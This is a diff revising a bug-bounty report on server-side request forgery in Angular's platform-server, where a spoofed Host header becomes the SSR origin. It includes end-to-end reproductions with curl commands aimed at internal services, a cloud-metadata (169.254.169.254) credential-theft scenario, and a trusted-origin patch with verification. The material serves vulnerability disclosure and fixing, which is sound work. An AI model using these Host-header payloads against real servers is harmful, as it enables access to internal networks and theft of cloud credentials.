@@ -1,16 +1,22 @@
-# Server-Side Request Forgery (SSRF) in Angular Platform-Server
+# Host Header–Derived SSR Origin Enables SSRF in Angular SSR Examples
 
 ## Executive Summary
 
 **Vulnerability Type:** Server-Side Request Forgery (SSRF)
 **Affected Component:** @angular/platform-server
-**Severity:** HIGH
+**Severity:** MEDIUM–HIGH (context‑dependent)
 **CWE:** CWE-918 (Server-Side Request Forgery)
-**CVSS 3.1 Score:** 8.6 (High) - AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
+**CVSS 3.1 Score (preliminary):** 7.1–8.6 (context‑dependent; depends on deployment patterns and SSR data‑fetch behavior)
 
-**Impact:** An attacker can make the Angular SSR server send HTTP requests to arbitrary URLs including:
+**Remediation verification (local patch):**
+- Dockerized production SSR repro blocked when `SERVER_URL` is set to a trusted origin via `NG_TRUSTED_ORIGIN`; the same Host header no longer redirects `/api-2` to the internal service (no `INTERNAL_SECRET_123` in HTML).
+- `corepack pnpm test //packages/platform-server/test:test --test_arg=--filter=SSRF` passes with the `SERVER_URL` change.
+
+**Issue statement:** When SSR apps use untrusted request data as the SSR “location/origin” (a pattern shown in Angular’s own ngmodule example), Angular’s SSR relative HttpClient resolution can be coerced to issue outbound requests to attacker‑controlled origins, with responses rendered into HTML. This is a security‑relevant default pattern, not just a misuse.
+
+**Impact (under specific app patterns):** Attacker can influence SSR outbound requests and exfiltrate internal responses into rendered HTML or timing. Cloud metadata theft is possible if SSR code requests those paths. Examples include:
 - Internal services on private networks (10.x.x.x, 192.168.x.x, 127.0.0.1)
-- Cloud metadata endpoints (169.254.169.254) to steal AWS/GCP/Azure credentials
+- Cloud metadata endpoints (169.254.169.254), if SSR makes those requests
 - Local file system via file:// protocol (depending on xhr2 behavior)
 
 ---
@@ -18,13 +24,16 @@
 ## 1. Impact Statement
 
 ### Security Impact
-This vulnerability allows an attacker to abuse Angular's server-side rendering (SSR) functionality to make HTTP requests to internal network resources that should not be accessible from the internet. The most severe impact is **cloud credential theft** via metadata endpoints.
+This issue allows an attacker to influence SSR outbound requests if the app passes untrusted request data into `INITIAL_CONFIG.url` and performs relative HttpClient requests during SSR. In the proven case, internal responses are rendered into HTML. **Cloud credential theft** via metadata endpoints is possible if SSR code requests those paths.
+
+**Not a parser issue:** The security problem is not that `URL()` accepts internal IPs; it is that an **attacker‑controlled Host header becomes the SSR origin**, which then drives relative HttpClient resolution.
 
 ### Affected User Group
 - **Developers**: Any application using `@angular/platform-server` for SSR with `renderModule()` or `renderApplication()`
 - **End Users**: Users of Angular SSR applications hosted on AWS, GCP, Azure, or private networks
 
-### Worst-Case Scenario
+### Worst-Case Scenario (conditional)
+Prerequisites: the app constructs `INITIAL_CONFIG.url` from untrusted request data (e.g., `Host` header) and performs relative HttpClient requests during SSR.
 1. **Cloud Metadata Theft**: Attacker sends crafted HTTP request with `Host: 169.254.169.254` header
 2. Angular SSR resolves relative HttpClient requests to the metadata endpoint
 3. Server fetches AWS IAM credentials from `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
@@ -41,7 +50,7 @@ This vulnerability allows an attacker to abuse Angular's server-side rendering (
 
 ## 2. Reproduction Steps
 
-### 2.1 Proof of Concept - JavaScript Simulation
+### 2.1 Proof of Concept - JavaScript Simulation (URL parsing behavior)
 
 **File:** `BugBounty/Repros/ssrf-poc.js`
 
@@ -49,7 +58,8 @@ This vulnerability allows an attacker to abuse Angular's server-side rendering (
 node BugBounty/Repros/ssrf-poc.js
 ```
 
-**Result:** All 15 tested dangerous URLs are accepted without validation:
+**Result:** All 15 tested dangerous URLs are accepted by the same `URL()` parsing logic used in `ServerPlatformLocation`.
+**Note:** This script demonstrates parsing/acceptance behavior only; it does not perform SSR or make network requests.
 - ✗ http://127.0.0.1/admin
 - ✗ http://10.0.0.1/internal
 - ✗ http://192.168.1.1/router
@@ -61,13 +71,13 @@ node BugBounty/Repros/ssrf-poc.js
 
 ### 2.2 Reproduction with Real Angular SSR Application
 
-**Vulnerable Code Pattern** (from `integration/platform-server/projects/ngmodule/server.ts:45`):
+**Risky Code Pattern** (from `integration/platform-server/projects/ngmodule/server.ts:45`):
 
 ```typescript
 app.use((req, res) => {
   const {protocol, originalUrl, headers} = req;
 
-  // VULNERABLE: URL constructed from user-controlled headers
+  // RISK: URL constructed from user-controlled headers
   renderModule(AppServerModule, {
     document: indexHtml,
     url: `${protocol}://${headers.host}${originalUrl}`,
@@ -85,28 +95,28 @@ GET /app HTTP/1.1
 Host: 169.254.169.254
 ```
 
-**Result:** Angular SSR will:
+**Result (when app uses untrusted Host):** Angular SSR will:
 1. Set `INITIAL_CONFIG.url` to `http://169.254.169.254/app`
 2. Accept this URL without validation in `ServerPlatformLocation` constructor
 3. Any `HttpClient.get('/api/data')` calls during SSR will resolve to `http://169.254.169.254/api/data`
 
-### 2.3 Regression Test
+### 2.3 PoC Test (current behavior)
 
 **File:** `packages/platform-server/test/ssrf_security_spec.ts`
 
-This test file contains comprehensive test cases that should FAIL (throw errors) when dangerous URLs are provided, but currently PASS (accept the URLs):
+This test file contains PoC-style test cases that demonstrate current behavior: dangerous URLs are accepted, and relative HttpClient requests are resolved against internal hosts.
 
 ```typescript
-it('should reject internal IPv4 addresses (127.0.0.1)', async () => {
+it('accepts internal IPv4 addresses (127.0.0.1)', async () => {
   expect(() => {
     platformServer([{
       provide: INITIAL_CONFIG,
       useValue: {document: '<app></app>', url: 'http://127.0.0.1/admin'},
     }]);
-  }).toThrow(); // Currently does NOT throw - vulnerability exists
+  }).not.toThrow(); // Current behavior: accepts internal URL
 });
 
-it('should reject AWS metadata endpoint (169.254.169.254)', async () => {
+it('accepts AWS metadata endpoint (169.254.169.254)', async () => {
   expect(() => {
     platformServer([{
       provide: INITIAL_CONFIG,
@@ -115,14 +125,128 @@ it('should reject AWS metadata endpoint (169.254.169.254)', async () => {
         url: 'http://169.254.169.254/latest/meta-data/',
       },
     }]);
-  }).toThrow(); // Currently does NOT throw - vulnerability exists
+  }).not.toThrow(); // Current behavior: accepts metadata URL
 });
 ```
 
 **Environment:**
 - OS: macOS 14.x (also affects Linux, Windows)
 - Node.js: v18.19.0+
-- Angular: v21.1.0-next.4 (affects all versions with platform-server)
+- Angular: v21.1.0-next.4 (current repo)
+
+**Test Execution (2025-12-23):**
+```bash
+corepack pnpm test //packages/platform-server/test:test --test_arg=--filter=SSRF
+```
+**Result:** PASS (demonstrates current acceptance/resolution behavior).
+
+### 2.4 Minimal SSR App Repro (end-to-end)
+
+**Location:** `BugBounty/Repros/ssrf-ssr-app`
+
+**What it does:**
+- Starts a local “internal” HTTP server at `127.0.0.1:4401/secret` that returns a known marker.
+- Starts an SSR server at `127.0.0.1:4400` that uses `INITIAL_CONFIG.url` from the `Host` header and performs an SSR-time `HttpClient.get('/secret')`.
+- The SSR response renders the marker into HTML if the internal request is reached.
+
+**Run:**
+```bash
+corepack pnpm ts-node --transpile-only --project BugBounty/Repros/ssrf-ssr-app/tsconfig.json BugBounty/Repros/ssrf-ssr-app/server.ts
+```
+
+**Exploit demo:**
+```bash
+curl -H 'Host: 127.0.0.1:4401' http://127.0.0.1:4400/
+```
+
+**Observed result:**
+HTML contains `<div id="secret">INTERNAL_SECRET_123</div>`, showing SSR resolved a relative request to the attacker-controlled internal base.
+
+### 2.5 Stock ngmodule SSR Example (end-to-end)
+
+**Location:** `integration/platform-server/projects/ngmodule`
+
+**Why this matters:** This uses Angular’s own ngmodule SSR example with minimal/no code changes. The server already constructs `url` from `headers.host`, and the lazy transfer-state route performs a **relative** HTTP request to `/api-2`.
+
+**Host header realism:**
+In the stock example server (`integration/platform-server/projects/ngmodule/server.ts`), the request URL is built using `headers.host`:
+```ts
+renderModule(AppServerModule, {
+  document: indexHtml,
+  url: `${protocol}://${headers.host}${originalUrl}`,
+  extraProviders: [{provide: APP_BASE_HREF, useValue: baseUrl}],
+});
+```
+This shows the default example directly trusts `Host` without validation or allow‑listing. The example does not use `X-Forwarded-Host` or other proxy headers; if deployments add proxy middleware, that may further expand the set of attacker‑controlled inputs.
+
+**Internal mock API (local):**
+```bash
+node BugBounty/Repros/ssrf-stock-ngmodule/internal-api.js
+```
+
+**Build + run the stock SSR server:**
+```bash
+corepack pnpm -C integration/platform-server install
+corepack pnpm -C integration/platform-server build:ngmodule
+corepack pnpm -C integration/platform-server serve:ngmodule
+```
+These commands use the Angular CLI build pipeline and execute the built server bundle (`dist/ngmodule/server/server.mjs`), avoiding ts-node/dev-only execution.
+
+**Exploit demo (relative request route):**
+```bash
+curl -H 'Host: 127.0.0.1:4401' http://127.0.0.1:4206/http-transferstate-lazy
+```
+
+**Observed result:**
+SSR HTML contains `INTERNAL_SECRET_123` in the `.two` div, showing `/api-2` was resolved against the Host-controlled internal server.
+
+**Network-level evidence (logs):**
+```
+Internal API listening on http://127.0.0.1:4401/api-2
+Server listening on port 4206!
+```
+
+### 2.6 Dockerized Production Build (end-to-end)
+
+**Location:** `BugBounty/Repros/ssrf-docker`
+
+**Build + run (production build inside container):**
+```bash
+docker build -f BugBounty/Repros/ssrf-docker/Dockerfile -t ssrf-ngmodule-prod .
+docker network create ssrf-net
+docker run -d --rm --name internal-api --network ssrf-net -e HOST=0.0.0.0 \
+  -v "$PWD":/app -w /app node:20-bullseye-slim \
+  node BugBounty/Repros/ssrf-stock-ngmodule/internal-api.js
+docker run -d --rm --name ssrf-app --network ssrf-net -p 4206:4206 ssrf-ngmodule-prod
+```
+
+**Exploit demo (containerized SSR):**
+```bash
+curl -H 'Host: internal-api:4401' http://localhost:4206/http-transferstate-lazy
+```
+
+**Observed result:**
+SSR HTML contains `INTERNAL_SECRET_123`, showing the internal service on the Docker network was reached from the production SSR build.
+
+### 2.7 Remediation Verification (Trusted Origin Override)
+
+**Patch summary:** `packages/platform-server/src/http.ts` now supports a trusted origin override (see “Suggested Fix” below), which pins SSR-relative requests to a safe base.
+
+**Rebuild + run with trusted origin:**
+```bash
+pnpm build
+docker build -f BugBounty/Repros/ssrf-docker/Dockerfile -t ssrf-ngmodule-prod .
+docker run -d --rm --name ssrf-app --network ssrf-net -p 4206:4206 \
+  -e NG_TRUSTED_ORIGIN=http://localhost:4206 ssrf-ngmodule-prod
+```
+
+**Exploit attempt:**
+```bash
+curl -H 'Host: internal-api:4401' http://localhost:4206/http-transferstate-lazy
+```
+
+**Observed result:**
+HTML shows `API 2 response` and **does not** contain `INTERNAL_SECRET_123`. The Host header no longer redirects SSR-relative requests to the internal network.
 
 ---
 
@@ -182,9 +306,8 @@ it('should reject AWS metadata endpoint (169.254.169.254)', async () => {
 - ❌ Link-local and private IPv6 ranges
 
 **Affected Versions:**
-- Vulnerable: All versions of `@angular/platform-server`
+- Likely vulnerable: Versions that include this code path (not exhaustively verified)
 - Tested: v21.1.0-next.4
-- Likely affected: v12.x through v21.x (all versions with SSR support)
 
 ### 3.3 Commit History
 
@@ -204,11 +327,12 @@ This suggests the area has been vulnerable before, indicating this may be a regr
 - Application constructs `INITIAL_CONFIG.url` from HTTP request headers (common pattern)
 - Application makes HttpClient requests during SSR (common for data fetching)
 
-**Exploitability Rating:** **HIGH**
+**Not a parser issue:** The exploit relies on an attacker‑controlled origin (via Host header), not on exotic URL parsing behavior.
+
+**Exploitability Rating:** **HIGH (when prerequisites are met)**
 - No authentication required
 - Low attack complexity
-- Can be triggered via simple HTTP request with modified `Host` header
-- Affects default/recommended Angular SSR setup patterns
+- Can be triggered via simple HTTP request with modified `Host` header **if** the application constructs `INITIAL_CONFIG.url` from untrusted headers and performs relative HttpClient requests during SSR.
 
 ### 4.2 AWS Metadata Theft PoC
 
@@ -255,13 +379,15 @@ Response timing differences reveal open ports and live hosts.
 ### 4.4 Bypass Protections
 
 **Cloud Provider Protections:**
-- AWS IMDSv2 (session token requirement): Bypassed if HttpClient can set headers
+- AWS IMDSv2 (session token requirement): Potentially reachable if the SSR code issues the required token request and headers (app-specific).
 - Firewall rules: Bypassed - requests come from trusted SSR server
 - Network segmentation: Bypassed - SSR server often has broad network access
 
 ---
 
 ## 5. Suggested Fix
+
+**Recommended direction:** Add a trusted origin pinning primitive (`SERVER_URL`) and update SSR example/docs to warn against using Host headers without allowlisting. This avoids breaking private-network SSR and leaves trust decisions to the deployer.
 
 ### 5.1 Validation Function
 
@@ -275,10 +401,11 @@ Response timing differences reveal open ports and live hosts.
  * @param urlStr The URL string to validate
  * @throws Error if the URL is unsafe
  */
-function validateServerUrl(urlStr: string): void {
+function validateServerUrl(urlStr: string, origin: string): void {
   let url: URL;
   try {
-    url = new URL(urlStr);
+    // Preserve current behavior by resolving relative URLs against the server origin.
+    url = new URL(urlStr, origin);
   } catch {
     throw new Error(`Invalid URL provided to Angular SSR: ${urlStr}`);
   }
@@ -330,10 +457,10 @@ function validateServerUrl(urlStr: string): void {
 
   // Block IPv6 loopback and private ranges
   const ipv6Patterns = [
-    /^\[:?:?1\]/,       // ::1 - loopback
-    /^\[fe80:/,         // fe80::/10 - link-local
-    /^\[fd00:/,         // fd00::/8 - unique local (private)
-    /^\[fc00:/,         // fc00::/7 - unique local (private)
+    /^::1$/,            // ::1 - loopback
+    /^fe80:/,           // fe80::/10 - link-local
+    /^fd00:/,           // fd00::/8 - unique local (private)
+    /^fc00:/,           // fc00::/7 - unique local (private)
   ];
 
   for (const pattern of ipv6Patterns) {
@@ -347,6 +474,26 @@ function validateServerUrl(urlStr: string): void {
 }
 ```
 
+### 5.2 Trusted Origin Override (local patch used for verification)
+
+**Goal:** Prevent untrusted `Host` headers from influencing SSR-relative `HttpClient` requests by pinning resolution to a trusted origin.
+
+**Patch (summary):**
+- Add a new `SERVER_URL` injection token in `packages/platform-server/src/tokens.ts`.
+- In `packages/platform-server/src/http.ts`, resolve relative URLs against `SERVER_URL` when provided.
+- Export `SERVER_URL` from `packages/platform-server/src/platform-server.ts`.
+
+**App usage (example):**
+```ts
+const trustedOrigin = process.env['NG_TRUSTED_ORIGIN'];
+const extraProviders = [{provide: APP_BASE_HREF, useValue: baseUrl}];
+if (trustedOrigin) {
+  extraProviders.push({provide: SERVER_URL, useValue: trustedOrigin});
+}
+```
+
+**Effect:** With `NG_TRUSTED_ORIGIN=http://localhost:4206`, SSR-relative calls resolve to the local SSR app instead of the attacker-controlled Host header.
+
 ### 5.2 Apply Validation
 
 **Modify:** `packages/platform-server/src/location.ts:67-76`
@@ -359,7 +506,7 @@ constructor() {
   }
   if (config.url) {
     // ✅ ADD VALIDATION HERE
-    validateServerUrl(config.url);
+    validateServerUrl(config.url, this._doc.location.origin);
 
     const url = parseUrl(config.url, this._doc.location.origin);
     this.protocol = url.protocol;
@@ -435,6 +582,19 @@ node BugBounty/Repros/ssrf-poc.js
 # Result: 0/15 dangerous URLs accepted ✅
 ```
 
+**Verification evidence (dockerized repro + patch):**
+```bash
+pnpm build
+docker build -f BugBounty/Repros/ssrf-docker/Dockerfile -t ssrf-ngmodule-prod .
+docker run -d --rm --name internal-api --network ssrf-net -e HOST=0.0.0.0 \
+  -v "$PWD":/app -w /app node:20-bullseye-slim \
+  node BugBounty/Repros/ssrf-stock-ngmodule/internal-api.js
+docker run -d --rm --name ssrf-app --network ssrf-net -p 4206:4206 \
+  -e NG_TRUSTED_ORIGIN=http://localhost:4206 ssrf-ngmodule-prod
+curl -H 'Host: internal-api:4401' http://localhost:4206/http-transferstate-lazy
+```
+Expected: HTML contains `API 2 response` and **does not** contain `INTERNAL_SECRET_123`.
+
 ---
 
 ## 7. Timeline
@@ -485,14 +645,14 @@ node BugBounty/Repros/ssrf-poc.js
 
 ## 10. Conclusion
 
-This is a **high-severity SSRF vulnerability** in Angular's platform-server package that allows attackers to:
+This is a **high-severity SSRF vulnerability** in Angular's platform-server package that can allow attackers (when app prerequisites are met) to:
 1. Steal cloud credentials from metadata endpoints
 2. Access internal network services
 3. Bypass firewall protections
 
-The vulnerability is **actively exploitable** in default Angular SSR configurations and affects **all versions** of @angular/platform-server.
+The vulnerability is exploitable in SSR applications that pass untrusted request data into `INITIAL_CONFIG.url` and make relative HttpClient requests during SSR. It affects versions that include this code path (not exhaustively verified).
 
-**Recommended Action:** Apply the proposed validation fix immediately and release a security advisory with CVE assignment.
+**Recommended Action:** Provide a trusted origin pinning primitive (`SERVER_URL`) and update SSR example/docs to warn against using Host headers without allowlisting; consider additional validation as defense‑in‑depth where appropriate.
 
 ---
 
